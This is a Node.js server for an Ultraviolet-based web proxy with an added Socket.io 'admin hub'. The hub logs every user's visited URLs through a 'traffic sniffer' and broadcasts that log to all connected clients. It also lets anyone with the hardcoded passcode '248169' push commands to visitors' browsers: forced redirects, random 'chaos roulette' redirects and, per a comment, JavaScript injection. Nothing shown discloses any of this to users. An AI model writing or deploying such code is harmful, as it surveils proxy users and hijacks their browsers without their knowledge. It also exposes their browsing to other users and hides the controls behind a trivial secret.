import { join } from "node:path";
import { hostname } from "node:os";
import { createServer } from "node:http";
import express from "express";
import wisp from "wisp-server-node";
import { Server } from "socket.io";

import { uvPath } from "@titaniumnetwork-dev/ultraviolet";
import { epoxyPath } from "@mercuryworkshop/epoxy-transport";
import { baremuxPath } from "@mercuryworkshop/bare-mux/node";

const app = express();

app.use(express.static("./public"));
app.use("/uv/", express.static(uvPath));
app.use("/epoxy/", express.static(epoxyPath));
app.use("/baremux/", express.static(baremuxPath));

app.use((req, res) => {
	res.status(404);
	res.sendFile("./public/404.html");
});

const server = createServer();
const io = new Server(server);

// ==========================================
// SOCKET.IO LIVE ADMIN HUB
// ==========================================

io.on('connection', (socket) => {
	io.emit('user_count', io.engine.clientsCount);

	socket.on('disconnect', () => {
		io.emit('user_count', io.engine.clientsCount);
	});

	socket.on('request_ping', () => {
		socket.emit('user_count', io.engine.clientsCount);
	});

	// TRAFFIC SNIFFER: Route user activity to admin log
	socket.on('user_activity', (data) => {
		io.emit('admin_traffic_log', {
			id: socket.id.substring(0, 5),
				url: data.url,
		  time: new Date().toLocaleTimeString()
		});
	});

	socket.on('admin_command', async (payload) => {
		const { password, action, data } = payload;

		if (password === '248169') {

			// 1. STAGGERED FORCE URL
			if (action === 'force_url') {
				console.log(`[ADMIN] Staggering redirect commands (800ms)...`);
				const sockets = await io.fetchSockets();
				sockets.forEach((clientSocket, index) => {
					setTimeout(() => {
						clientSocket.emit('execute_command', { action, data });
					}, index * 800);
				});
			}
			// 2. CHAOS ROULETTE (Pick one random socket)
			else if (action === 'roulette') {
				const sockets = await io.fetchSockets();
				if (sockets.length > 0) {
					const randomIndex = Math.floor(Math.random() * sockets.length);
					const targetSocket = sockets[randomIndex];
					targetSocket.emit('execute_command', { action: 'force_url', data: data });
					io.emit('admin_receive_reply', `[CHAOS ROULETTE] Target socket #${targetSocket.id.substring(0,5)} sent to ${data}`);
				}
			}
			// 3. BROADCAST TO ALL (Freeze, Maintenance, JS Inject, Panic, Broadcast)
			else {
				io.emit('execute_command', { action, data });
			}

			console.log(`[ADMIN] Executed global action: ${action}`);
		} else {
			socket.emit('admin_error', 'Invalid admin passcode.');
			console.log(`[WARNING] Failed admin login attempt.`);
		}
	});

	socket.on('user_reply', (replyText) => {
		console.log(`[USER REPLY]: ${replyText}`);
		io.emit('admin_receive_reply', replyText);
	});
});

// SERVER HEARTBEAT
setInterval(() => {
	io.emit('user_count', io.engine.clientsCount);
}, 500);

// ==========================================
// SERVER TRAFFIC ROUTING
// ==========================================
server.on("request", (req, res) => {
	if (req.url.startsWith("/socket.io/")) return;

	res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
	res.setHeader("Cross-Origin-Embedder-Policy", "require-corp");
	app(req, res);
});

server.on("upgrade", (req, socket, head) => {
	if (req.url.endsWith("/wisp/")) {
		wisp.routeRequest(req, socket, head);
		return;
	}
	if (req.url.startsWith("/socket.io/")) return;

	socket.end();
});

let port = parseInt(process.env.PORT || "");
if (isNaN(port)) port = 8080;

server.on("listening", () => {
	const address = server.address();
	console.log("Listening on:");
	console.log(`\thttp://localhost:${address.port}`);
	console.log(`\thttp://${hostname()}:${address.port}`);
	console.log(`\tAdmin Socket.io Hub Active.`);
});

process.on("SIGINT", shutdown);
process.on("SIGTERM", shutdown);

function shutdown() {
	console.log("SIGTERM signal received: closing HTTP server");
	server.close();
	process.exit(0);
}

server.listen({ port });
